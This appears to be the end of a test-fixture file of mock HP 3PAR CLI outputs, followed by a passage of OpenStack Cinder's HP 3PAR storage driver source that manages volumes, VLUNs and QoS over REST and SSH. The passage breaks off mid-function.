    '0:2:2,2FF70002AC00383D,20220002AC00383D\r\n'
    '0:2:3,2FF70002AC00383D,20230002AC00383D\r\n'
    '0:2:4,2FF70002AC00383D,20240002AC00383D\r\n'
    '0:5:1,2FF70002AC00383D,20510002AC00383D\r\n'
    '0:5:2,2FF70002AC00383D,20520002AC00383D\r\n'
    '0:5:3,2FF70002AC00383D,20530002AC00383D\r\n'
    '0:5:4,2FF70202AC00383D,20540202AC00383D\r\n'
    '0:6:4,2FF70002AC00383D,20640002AC00383D\r\n'
    '0:8:1,10.10.120.253,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '0:8:2,0.0.0.0,iqn.2000-05.com.3pardata:20820002ac00383d\r\n'
    '1:2:1,29210002AC00383D,21210002AC00383D\r\n'
    '1:2:2,2FF70002AC00383D,21220002AC00383D\r\n'
    '-----------------------------------------------------------------\r\n')

VOLUME_STATE_RET = (
    'Id,Name,Prov,Type,State,-Detailed_State-\r\n'
    '410,volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7,snp,vcopy,normal,'
    'normal\r\n'
    '-----------------------------------------------------------------\r\n')

PORT_RET = (
    'N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,Protocol,'
    'Label,Partner,FailoverState\r\n'
    '0:2:1,target,ready,28210002AC00383D,20210002AC00383D,host,FC,'
    '-,1:2:1,none\r\n'
    '0:2:2,initiator,loss_sync,2FF70002AC00383D,20220002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:2:3,initiator,loss_sync,2FF70002AC00383D,20230002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:2:4,initiator,loss_sync,2FF70002AC00383D,20240002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:1,initiator,loss_sync,2FF70002AC00383D,20510002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:2,initiator,loss_sync,2FF70002AC00383D,20520002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:3,initiator,loss_sync,2FF70002AC00383D,20530002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:4,initiator,ready,2FF70202AC00383D,20540202AC00383D,host,FC,'
    '-,1:5:4,active\r\n'
    '0:6:1,initiator,ready,2FF70002AC00383D,20610002AC00383D,disk,FC,'
    '-,-,-\r\n'
    '0:6:2,initiator,ready,2FF70002AC00383D,20620002AC00383D,disk,FC,'
    '-,-,-\r\n')

ISCSI_PORT_RET = (
    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'
    'iSNS_Port\r\n'
    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '0:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,82,1500,n/a,0,0.0.0.0,3205\r\n'
    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '1:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,182,1500,n/a,0,0.0.0.0,3205\r\n')

ISCSI_3PAR_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost.foo,Generic,iqn.1993-08.org.debian:01:222,---,'
    '10.10.222.12\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost.foo,--,--\r\n'
    '\r\n'
    '---------- Host fakehost.foo ----------\r\n'
    'Name       : fakehost.foo\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

SHOW_PORT_ISCSI = (
    'N:S:P,IPAddr,---------------iSCSI_Name----------------\r\n'
    '0:8:1,1.1.1.2,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '0:8:2,10.10.120.252,iqn.2000-05.com.3pardata:20820002ac00383d\r\n'
    '1:8:1,10.10.220.253,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '1:8:2,10.10.220.252,iqn.2000-05.com.3pardata:21820002ac00383d\r\n'
    '-------------------------------------------------------------\r\n')

SHOW_VLUN = (
    'Lun,VVName,HostName,---------Host_WWN/iSCSI_Name----------,Port,Type,'
    'Status,ID\r\n'
    '0,a,fakehost,iqn.1993-08.org.debian:01:3a779e4abc22,1:8:1,matched set,'
    'active,0\r\n'
    '------------------------------------------------------------------------'
    '--------------\r\n')

SHOW_VLUN_NONE = (
    'Port\r\n0:2:1\r\n0:2:1\r\n1:8:1\r\n1:8:1\r\n1:8:1\r\n1:2:1\r\n'
    '1:2:1\r\n1:2:1\r\n1:2:1\r\n1:2:1\r\n1:2:1\r\n1:8:1\r\n1:8:1\r\n1:8:1\r\n'
    '1:8:1\r\n1:8:1\r\n1:8:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n'
    '0:2:1\r\n0:2:1\r\n1:8:1\r\n1:8:1\r\n0:2:1\r\n0:2:1\r\n1:2:1\r\n1:2:1\r\n'
    '1:2:1\r\n1:2:1\r\n1:8:1\r\n-----')

READY_ISCSI_PORT_RET = (
    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'
    'iSNS_Port\r\n'
    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '0:8:2,ready,10.10.120.252,255.255.224.0,0.0.0.0,82,1500,10Gbps,0,'
    '0.0.0.0,3205\r\n'
    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '1:8:2,ready,10.10.220.252,255.255.224.0,0.0.0.0,182,1500,10Gbps,0,'
    '0.0.0.0,3205\r\n'
    '-------------------------------------------------------------------'
    '----------------------\r\n')
/n/n/ncinder/volume/drivers/san/hp/hp_3par_common.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver common utilities for HP 3PAR Storage array

The 3PAR drivers requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

The drivers uses both the REST service and the SSH
command line to correctly operate.  Since the
ssh credentials and the REST credentials can be different
we need to have settings for both.

The drivers requires the use of the san_ip, san_login,
san_password settings for ssh connections into the 3PAR
array.   It also requires the setting of
hp3par_api_url, hp3par_username, hp3par_password
for credentials to talk to the REST service on the 3PAR
array.
""""""

import ast
import base64
import json
import paramiko
import pprint
from random import randint
import re
import time
import uuid

from eventlet import greenthread
from hp3parclient import client
from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import context
from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import volume_types


LOG = logging.getLogger(__name__)

hp3par_opts = [
    cfg.StrOpt('hp3par_api_url',
               default='',
               help=""3PAR WSAPI Server Url like ""
                    ""https://<3par ip>:8080/api/v1""),
    cfg.StrOpt('hp3par_username',
               default='',
               help=""3PAR Super user username""),
    cfg.StrOpt('hp3par_password',
               default='',
               help=""3PAR Super user password"",
               secret=True),
    #TODO(kmartin): Remove hp3par_domain during I release.
    cfg.StrOpt('hp3par_domain',
               default=None,
               help=""This option is DEPRECATED and no longer used. ""
                    ""The 3par domain name to use.""),
    cfg.StrOpt('hp3par_cpg',
               default=""OpenStack"",
               help=""The CPG to use for volume creation""),
    cfg.StrOpt('hp3par_cpg_snap',
               default="""",
               help=""The CPG to use for Snapshots for volumes. ""
                    ""If empty hp3par_cpg will be used""),
    cfg.StrOpt('hp3par_snapshot_retention',
               default="""",
               help=""The time in hours to retain a snapshot.  ""
                    ""You can't delete it before this expires.""),
    cfg.StrOpt('hp3par_snapshot_expiration',
               default="""",
               help=""The time in hours when a snapshot expires ""
                    "" and is deleted.  This must be larger than expiration""),
    cfg.BoolOpt('hp3par_debug',
                default=False,
                help=""Enable HTTP debugging to 3PAR""),
    cfg.ListOpt('hp3par_iscsi_ips',
                default=[],
                help=""List of target iSCSI addresses to use."")
]


CONF = cfg.CONF
CONF.register_opts(hp3par_opts)


class HP3PARCommon(object):

    stats = {}

    # Valid values for volume type extra specs
    # The first value in the list is the default value
    valid_prov_values = ['thin', 'full']
    valid_persona_values = ['1 - Generic',
                            '2 - Generic-ALUA',
                            '6 - Generic-legacy',
                            '7 - HPUX-legacy',
                            '8 - AIX-legacy',
                            '9 - EGENERA',
                            '10 - ONTAP-legacy',
                            '11 - VMware',
                            '12 - OpenVMS']
    hp_qos_keys = ['maxIOPS', 'maxBWS']
    hp3par_valid_keys = ['cpg', 'snap_cpg', 'provisioning', 'persona', 'vvs']

    def __init__(self, config):
        self.sshpool = None
        self.config = config
        self.hosts_naming_dict = dict()
        self.client = None
        if CONF.hp3par_domain is not None:
            LOG.deprecated(_(""hp3par_domain has been deprecated and ""
                             ""is no longer used. The domain is automatically ""
                             ""looked up based on the CPG.""))

    def check_flags(self, options, required_flags):
        for flag in required_flags:
            if not getattr(options, flag, None):
                raise exception.InvalidInput(reason=_('%s is not set') % flag)

    def _create_client(self):
        return client.HP3ParClient(self.config.hp3par_api_url)

    def client_login(self):
        try:
            LOG.debug(""Connecting to 3PAR"")
            self.client.login(self.config.hp3par_username,
                              self.config.hp3par_password)
        except hpexceptions.HTTPUnauthorized as ex:
            LOG.warning(""Failed to connect to 3PAR (%s) because %s"" %
                       (self.config.hp3par_api_url, str(ex)))
            msg = _(""Login to 3PAR array invalid"")
            raise exception.InvalidInput(reason=msg)

    def client_logout(self):
        self.client.logout()
        LOG.debug(""Disconnect from 3PAR"")

    def do_setup(self, context):
        self.client = self._create_client()
        if self.config.hp3par_debug:
            self.client.debug_rest(True)

        self.client_login()

        try:
            # make sure the default CPG exists
            self.validate_cpg(self.config.hp3par_cpg)
            self._set_connections()
        finally:
            self.client_logout()

    def validate_cpg(self, cpg_name):
        try:
            cpg = self.client.getCPG(cpg_name)
        except hpexceptions.HTTPNotFound as ex:
            err = (_(""CPG (%s) doesn't exist on array"") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

    def _set_connections(self):
        """"""Set the number of concurrent connections.

        The 3PAR WS API server has a limit of concurrent connections.
        This is setting the number to the highest allowed, 15 connections.
        """"""
        self._cli_run(['setwsapi', '-sru', 'high'])

    def get_domain(self, cpg_name):
        try:
            cpg = self.client.getCPG(cpg_name)
        except hpexceptions.HTTPNotFound:
            err = (_(""Failed to get domain because CPG (%s) doesn't ""
                     ""exist on array."") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        domain = cpg['domain']
        if not domain:
            err = (_(""CPG (%s) must be in a domain"") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)
        return domain

    def extend_volume(self, volume, new_size):
        volume_name = self._get_3par_vol_name(volume['id'])
        old_size = volume.size
        growth_size = int(new_size) - old_size
        LOG.debug(""Extending Volume %s from %s to %s, by %s GB."" %
                  (volume_name, old_size, new_size, growth_size))
        try:
            self._cli_run(['growvv', '-f', volume_name, '%dg' % growth_size])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error extending volume %s"") % volume)

    def _get_3par_vol_name(self, volume_id):
        """"""Get converted 3PAR volume name.

        Converts the openstack volume id from
        ecffc30f-98cb-4cf5-85ee-d7309cc17cd2
        to
        osv-7P.DD5jLTPWF7tcwnMF80g

        We convert the 128 bits of the uuid into a 24character long
        base64 encoded string to ensure we don't exceed the maximum
        allowed 31 character name limit on 3Par

        We strip the padding '=' and replace + with .
        and / with -
        """"""
        volume_name = self._encode_name(volume_id)
        return ""osv-%s"" % volume_name

    def _get_3par_snap_name(self, snapshot_id):
        snapshot_name = self._encode_name(snapshot_id)
        return ""oss-%s"" % snapshot_name

    def _get_3par_vvs_name(self, volume_id):
        vvs_name = self._encode_name(volume_id)
        return ""vvs-%s"" % vvs_name

    def _encode_name(self, name):
        uuid_str = name.replace(""-"", """")
        vol_uuid = uuid.UUID('urn:uuid:%s' % uuid_str)
        vol_encoded = base64.b64encode(vol_uuid.bytes)

        # 3par doesn't allow +, nor /
        vol_encoded = vol_encoded.replace('+', '.')
        vol_encoded = vol_encoded.replace('/', '-')
        # strip off the == as 3par doesn't like those.
        vol_encoded = vol_encoded.replace('=', '')
        return vol_encoded

    def _capacity_from_size(self, vol_size):

        # because 3PAR volume sizes are in
        # Mebibytes, Gigibytes, not Megabytes.
        MB = 1000L
        MiB = 1.048576

        if int(vol_size) == 0:
            capacity = MB  # default: 1GB
        else:
            capacity = vol_size * MB

        capacity = int(round(capacity / MiB))
        return capacity

    def _cli_run(self, cmd):
        """"""Runs a CLI command over SSH, without doing any result parsing.""""""
        LOG.debug(""SSH CMD = %s "" % cmd)

        (stdout, stderr) = self._run_ssh(cmd, False)

        # we have to strip out the input and exit lines
        tmp = stdout.split(""\r\n"")
        out = tmp[5:len(tmp) - 2]
        return out

    def _ssh_execute(self, ssh, cmd, check_exit_code=True):
        """"""We have to do this in order to get CSV output from the CLI command.

        We first have to issue a command to tell the CLI that we want the
        output to be formatted in CSV, then we issue the real command.
        """"""
        LOG.debug(_('Running cmd (SSH): %s'), cmd)

        channel = ssh.invoke_shell()
        stdin_stream = channel.makefile('wb')
        stdout_stream = channel.makefile('rb')
        stderr_stream = channel.makefile('rb')

        stdin_stream.write('''setclienv csvtable 1
%s
exit
''' % cmd)

        # stdin.write('process_input would go here')
        # stdin.flush()

        # NOTE(justinsb): This seems suspicious...
        # ...other SSH clients have buffering issues with this approach
        stdout = stdout_stream.read()
        stderr = stderr_stream.read()
        stdin_stream.close()
        stdout_stream.close()
        stderr_stream.close()

        exit_status = channel.recv_exit_status()

        # exit_status == -1 if no exit code was returned
        if exit_status != -1:
            LOG.debug(_('Result was %s') % exit_status)
            if check_exit_code and exit_status != 0:
                raise exception.ProcessExecutionError(exit_code=exit_status,
                                                      stdout=stdout,
                                                      stderr=stderr,
                                                      cmd=cmd)
        channel.close()
        return (stdout, stderr)

    def _run_ssh(self, cmd_list, check_exit=True, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            self.sshpool = utils.SSHPool(self.config.san_ip,
                                         self.config.san_ssh_port,
                                         self.config.ssh_conn_timeout,
                                         self.config.san_login,
                                         password=self.config.san_password,
                                         privatekey=
                                         self.config.san_private_key,
                                         min_size=
                                         self.config.ssh_min_pool_conn,
                                         max_size=
                                         self.config.ssh_max_pool_conn)
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return self._ssh_execute(ssh, command,
                                                 check_exit_code=check_exit)
                    except Exception as e:
                        LOG.error(e)
                        greenthread.sleep(randint(20, 500) / 100.0)
                msg = (_(""SSH Command failed after '%(total_attempts)r' ""
                         ""attempts : '%(command)s'"") %
                       {'total_attempts': total_attempts, 'command': command})
                raise paramiko.SSHException(msg)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error running ssh command: %s"") % command)

    def _delete_3par_host(self, hostname):
        self._cli_run(['removehost', hostname])

    def _create_3par_vlun(self, volume, hostname):
        out = self._cli_run(['createvlun', volume, 'auto', hostname])
        if out and len(out) > 1:
            if ""must be in the same domain"" in out[0]:
                err = out[0].strip()
                err = err + "" "" + out[1].strip()
                raise exception.Invalid3PARDomain(err=err)

    def _safe_hostname(self, hostname):
        """"""We have to use a safe hostname length for 3PAR host names.""""""
        try:
            index = hostname.index('.')
        except ValueError:
            # couldn't find it
            index = len(hostname)

        # we'll just chop this off for now.
        if index > 23:
            index = 23

        return hostname[:index]

    def _get_3par_host(self, hostname):
        out = self._cli_run(['showhost', '-verbose', hostname])
        LOG.debug(""OUTPUT = \n%s"" % (pprint.pformat(out)))
        host = {'id': None, 'name': None,
                'domain': None,
                'descriptors': {},
                'iSCSIPaths': [],
                'FCPaths': []}

        if out:
            err = out[0]
            if err == 'no hosts listed':
                msg = {'code': 'NON_EXISTENT_HOST',
                       'desc': ""HOST '%s' was not found"" % hostname}
                raise hpexceptions.HTTPNotFound(msg)

            # start parsing the lines after the header line
            for line in out[1:]:
                if line == '':
                    break
                tmp = line.split(',')
                paths = {}

                LOG.debug(""line = %s"" % (pprint.pformat(tmp)))
                host['id'] = tmp[0]
                host['name'] = tmp[1]

                portPos = tmp[4]
                LOG.debug(""portPos = %s"" % (pprint.pformat(portPos)))
                if portPos == '---':
                    portPos = None
                else:
                    port = portPos.split(':')
                    portPos = {'node': int(port[0]), 'slot': int(port[1]),
                               'cardPort': int(port[2])}

                paths['portPos'] = portPos

                # If FC entry
                if tmp[5] == 'n/a':
                    paths['wwn'] = tmp[3]
                    host['FCPaths'].append(paths)
                # else iSCSI entry
                else:
                    paths['name'] = tmp[3]
                    paths['ipAddr'] = tmp[5]
                    host['iSCSIPaths'].append(paths)

            # find the offset to the description stuff
            offset = 0
            for line in out:
                if line[:15] == '---------- Host':
                    break
                else:
                    offset += 1

            info = out[offset + 2]
            tmp = info.split(':')
            host['domain'] = tmp[1]

            info = out[offset + 4]
            tmp = info.split(':')
            host['descriptors']['location'] = tmp[1]

            info = out[offset + 5]
            tmp = info.split(':')
            host['descriptors']['ipAddr'] = tmp[1]

            info = out[offset + 6]
            tmp = info.split(':')
            host['descriptors']['os'] = tmp[1]

            info = out[offset + 7]
            tmp = info.split(':')
            host['descriptors']['model'] = tmp[1]

            info = out[offset + 8]
            tmp = info.split(':')
            host['descriptors']['contact'] = tmp[1]

            info = out[offset + 9]
            tmp = info.split(':')
            host['descriptors']['comment'] = tmp[1]

        return host

    def get_ports(self):
        # First get the active FC ports
        out = self._cli_run(['showport'])

        # strip out header
        # N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,
        # Protocol,Label,Partner,FailoverState
        out = out[1:len(out) - 2]

        ports = {'FC': [], 'iSCSI': {}}
        for line in out:
            tmp = line.split(',')

            if tmp:
                if tmp[1] == 'target' and tmp[2] == 'ready':
                    if tmp[6] == 'FC':
                        ports['FC'].append(tmp[4])

        # now get the active iSCSI ports
        out = self._cli_run(['showport', '-iscsi'])

        # strip out header
        # N:S:P,State,IPAddr,Netmask,Gateway,
        # TPGT,MTU,Rate,DHCP,iSNS_Addr,iSNS_Port
        out = out[1:len(out) - 2]
        for line in out:
            tmp = line.split(',')

            if tmp and len(tmp) > 2:
                if tmp[1] == 'ready':
                    ports['iSCSI'][tmp[2]] = {}

        # now get the nsp and iqn
        result = self._cli_run(['showport', '-iscsiname'])
        if result:
            # first line is header
            # nsp, ip,iqn
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 2:
                    if info[1] in ports['iSCSI']:
                        nsp = info[0]
                        ip_addr = info[1]
                        iqn = info[2]
                        ports['iSCSI'][ip_addr] = {'nsp': nsp,
                                                   'iqn': iqn
                                                   }

        LOG.debug(""PORTS = %s"" % pprint.pformat(ports))
        return ports

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_volume_stats()

        return self.stats

    def _update_volume_stats(self):
        # const to convert MiB to GB
        const = 0.0009765625

        # storage_protocol and volume_backend_name are
        # set in the child classes
        stats = {'driver_version': '1.0',
                 'free_capacity_gb': 'unknown',
                 'reserved_percentage': 0,
                 'storage_protocol': None,
                 'total_capacity_gb': 'unknown',
                 'QoS_support': True,
                 'vendor_name': 'Hewlett-Packard',
                 'volume_backend_name': None}

        try:
            cpg = self.client.getCPG(self.config.hp3par_cpg)
            if 'limitMiB' not in cpg['SDGrowth']:
                total_capacity = 'infinite'
                free_capacity = 'infinite'
            else:
                total_capacity = int(cpg['SDGrowth']['limitMiB'] * const)
                free_capacity = int((cpg['SDGrowth']['limitMiB'] -
                                    cpg['UsrUsage']['usedMiB']) * const)

            stats['total_capacity_gb'] = total_capacity
            stats['free_capacity_gb'] = free_capacity
        except hpexceptions.HTTPNotFound:
            err = (_(""CPG (%s) doesn't exist on array"")
                   % self.config.hp3par_cpg)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        self.stats = stats

    def create_vlun(self, volume, host):
        """"""Create a VLUN.

        In order to export a volume on a 3PAR box, we have to create a VLUN.
        """"""
        volume_name = self._get_3par_vol_name(volume['id'])
        self._create_3par_vlun(volume_name, host['name'])
        return self.client.getVLUN(volume_name)

    def delete_vlun(self, volume, hostname):
        volume_name = self._get_3par_vol_name(volume['id'])
        vlun = self.client.getVLUN(volume_name)
        self.client.deleteVLUN(volume_name, vlun['lun'], hostname)
        self._delete_3par_host(hostname)

    def _get_volume_type(self, type_id):
        ctxt = context.get_admin_context()
        return volume_types.get_volume_type(ctxt, type_id)

    def _get_key_value(self, hp3par_keys, key, default=None):
        if hp3par_keys is not None and key in hp3par_keys:
            return hp3par_keys[key]
        else:
            return default

    def _get_qos_value(self, qos, key, default=None):
        if key in qos:
            return qos[key]
        else:
            return default

    def _get_qos_by_volume_type(self, volume_type):
        qos = {}
        specs = volume_type.get('extra_specs')
        for key, value in specs.iteritems():
            if 'qos:' in key:
                fields = key.split(':')
                key = fields[1]
            if key in self.hp_qos_keys:
                qos[key] = int(value)
        return qos

    def _get_keys_by_volume_type(self, volume_type):
        hp3par_keys = {}
        specs = volume_type.get('extra_specs')
        for key, value in specs.iteritems():
            if ':' in key:
                fields = key.split(':')
                key = fields[1]
            if key in self.hp3par_valid_keys:
                hp3par_keys[key] = value
        return hp3par_keys

    def _set_qos_rule(self, qos, vvs_name):
        max_io = self._get_qos_value(qos, 'maxIOPS')
        max_bw = self._get_qos_value(qos, 'maxBWS')
        cli_qos_string = """"
        if max_io is not None:
            cli_qos_string += ('-io %s ' % max_io)
        if max_bw is not None:
            cli_qos_string += ('-bw %sM ' % max_bw)
        self._cli_run(['setqos', '%svvset:%s' % (cli_qos_string, vvs_name)])

    def _add_volume_to_volume_set(self, volume, volume_name,
                                  cpg, vvs_name, qos):
        if vvs_name is not None:
            # Admin has set a volume set name to add the volume to
            self._cli_run(['createvvset', '-add', vvs_name, volume_name])
        else:
            vvs_name = self._get_3par_vvs_name(volume['id'])
            domain = self.get_domain(cpg)
            self._cli_run(['createvvset', '-domain', domain, vvs_name])
            self._set_qos_rule(qos, vvs_name)
            self._cli_run(['createvvset', '-add', vvs_name, volume_name])

    def _remove_volume_set(self, vvs_name):
        # Must first clear the QoS rules before removing the volume set
        self._cli_run(['setqos', '-clear', 'vvset:%s' % (vvs_name)])
        self._cli_run(['removevvset', '-f', vvs_name])

    def _remove_volume_from_volume_set(self, volume_name, vvs_name):
        self._cli_run(['removevvset', '-f', vvs_name, volume_name])

    def get_cpg(self, volume, allowSnap=False):
        volume_name = self._get_3par_vol_name(volume['id'])
        vol = self.client.getVolume(volume_name)
        if 'userCPG' in vol:
            return vol['userCPG']
        elif allowSnap:
            return vol['snapCPG']
        return None

    def _get_3par_vol_comment(self, volume_name):
        vol = self.client.getVolume(volume_name)
        if 'comment' in vol:
            return vol['comment']
        return None

    def get_persona_type(self, volume, hp3par_keys=None):
        default_persona = self.valid_persona_values[0]
        type_id = volume.get('volume_type_id', None)
        volume_type = None
        if type_id is not None:
            volume_type = self._get_volume_type(type_id)
            if hp3par_keys is None:
                hp3par_keys = self._get_keys_by_volume_type(volume_type)
        persona_value = self._get_key_value(hp3par_keys, 'persona',
                                            default_persona)
        if persona_value not in self.valid_persona_values:
            err = _(""Must specify a valid persona %(valid)s, ""
                    ""value '%(persona)s' is invalid."") % \
                   ({'valid': self.valid_persona_values,
                     'persona': persona_value})
            raise exception.InvalidInput(reason=err)
        # persona is set by the id so remove the text and return the id
        # i.e for persona '1 - Generic' returns 1
        persona_id = persona_value.split(' ')
        return persona_id[0]

    def get_volume_settings_from_type(self, volume):
        cpg = None
        snap_cpg = None
        volume_type = None
        vvs_name = None
        hp3par_keys = {}
        qos = {}
        type_id = volume.get('volume_type_id', None)
        if type_id is not None:
            volume_type = self._get_volume_type(type_id)
            hp3par_keys = self._get_keys_by_volume_type(volume_type)
            vvs_name = self._get_key_value(hp3par_keys, 'vvs')
            if vvs_name is None:
                qos = self._get_qos_by_volume_type(volume_type)

        cpg = self._get_key_value(hp3par_keys, 'cpg',
                                  self.config.hp3par_cpg)
        if cpg is not self.config.hp3par_cpg:
            # The cpg was specified in a volume type extra spec so it
            # needs to be validiated that it's in the correct domain.
            self.validate_cpg(cpg)
            # Also, look to see if the snap_cpg was specified in volume
            # type extra spec, if not use the extra spec cpg as the
            # default.
            snap_cpg = self._get_key_value(hp3par_keys, 'snap_cpg', cpg)
        else:
            # default snap_cpg to hp3par_cpg_snap if it's not specified
            # in the volume type extra specs.
            snap_cpg = self.config.hp3par_cpg_snap
            # if it's still not set or empty then set it to the cpg
            # specified in the cinder.conf file.
            if not self.config.hp3par_cpg_snap:
                snap_cpg = cpg

        # if provisioning is not set use thin
        default_prov = self.valid_prov_values[0]
        prov_value = self._get_key_value(hp3par_keys, 'provisioning',
                                         default_prov)
        # check for valid provisioning type
        if prov_value not in self.valid_prov_values:
            err = _(""Must specify a valid provisioning type %(valid)s, ""
                    ""value '%(prov)s' is invalid."") % \
                   ({'valid': self.valid_prov_values,
                     'prov': prov_value})
            raise exception.InvalidInput(reason=err)

        tpvv = True
        if prov_value == ""full"":
            tpvv = False

        # check for valid persona even if we don't use it until
        # attach time, this will give the end user notice that the
        # persona type is invalid at volume creation time
        self.get_persona_type(volume, hp3par_keys)

        return {'cpg': cpg, 'snap_cpg': snap_cpg,
                'vvs_name': vvs_name, 'qos': qos,
                'tpvv': tpvv, 'volume_type': volume_type}

    def create_volume(self, volume):
        LOG.debug(""CREATE VOLUME (%s : %s %s)"" %
                  (volume['display_name'], volume['name'],
                   self._get_3par_vol_name(volume['id'])))
        try:
            comments = {'volume_id': volume['id'],
                        'name': volume['name'],
                        'type': 'OpenStack'}

            name = volume.get('display_name', None)
            if name:
                comments['display_name'] = name

            # get the options supported by volume types
            type_info = self.get_volume_settings_from_type(volume)
            volume_type = type_info['volume_type']
            vvs_name = type_info['vvs_name']
            qos = type_info['qos']
            cpg = type_info['cpg']
            snap_cpg = type_info['snap_cpg']
            tpvv = type_info['tpvv']

            type_id = volume.get('volume_type_id', None)
            if type_id is not None:
                comments['volume_type_name'] = volume_type.get('name')
                comments['volume_type_id'] = type_id
                if vvs_name is not None:
                    comments['vvs'] = vvs_name
                else:
                    comments['qos'] = qos

            extras = {'comment': json.dumps(comments),
                      'snapCPG': snap_cpg,
                      'tpvv': tpvv}

            capacity = self._capacity_from_size(volume['size'])
            volume_name = self._get_3par_vol_name(volume['id'])
            self.client.createVolume(volume_name, cpg, capacity, extras)
            if qos or vvs_name is not None:
                try:
                    self._add_volume_to_volume_set(volume, volume_name,
                                                   cpg, vvs_name, qos)
                except Exception as ex:
                    # Delete the volume if unable to add it to the volume set
                    self.client.deleteVolume(volume_name)
                    LOG.error(str(ex))
                    raise exception.CinderException(ex.get_description())
        except hpexceptions.HTTPConflict:
            raise exception.Duplicate(_(""Volume (%s) already exists on array"")
                                      % volume_name)
        except hpexceptions.HTTPBadRequest as ex:
            LOG.error(str(ex))
            raise exception.Invalid(ex.get_description())
        except exception.InvalidInput as ex:
            LOG.error(str(ex))
            raise ex
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex.get_description())

    def _copy_volume(self, src_name, dest_name, cpg=None, snap_cpg=None,
                     tpvv=True):
        # Virtual volume sets are not supported with the -online option
        cmd = ['createvvcopy', '-p', src_name, '-online']
        if snap_cpg:
            cmd.extend(['-snp_cpg', snap_cpg])
        if tpvv:
            cmd.append('-tpvv')
        if cpg:
            cmd.append(cpg)
        cmd.append(dest_name)
        LOG.debug('Creating clone of a volume with %s' % cmd)
        self._cli_run(cmd)

    def get_next_word(self, s, search_string):
        """"""Return the next word.

        Search 's' for 'search_string', if found return the word preceding
        'search_string' from 's'.
        """"""
        word = re.search(search_string.strip(' ') + ' ([^ ]*)', s)
        return word.groups()[0].strip(' ')

    def _get_3par_vol_comment_value(self, vol_comment, key):
        comment_dict = dict(ast.literal_eval(vol_comment))
        if key in comment_dict:
            return comment_dict[key]
        return None

    def create_cloned_volume(self, volume, src_vref):
        try:
            orig_name = self._get_3par_vol_name(volume['source_volid'])
            vol_name = self._get_3par_vol_name(volume['id'])

            type_info = self.get_volume_settings_from_type(volume)

            # make the 3PAR copy the contents.
            # can't delete the original until the copy is done.
            self._copy_volume(orig_name, vol_name, cpg=type_info['cpg'],
                              snap_cpg=type_info['snap_cpg'],
                              tpvv=type_info['tpvv'])
            return None
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex)

    def _get_vvset_from_3par(self, volume_name):
        """"""Get Virtual Volume Set from 3PAR.

        The only way to do this currently is to try and delete the volume
        to get the error message.

        NOTE(walter-boring): don't call this unless you know the volume is
        already in a vvset!
        """"""
        cmd = ['removevv', '-f', volume_name]
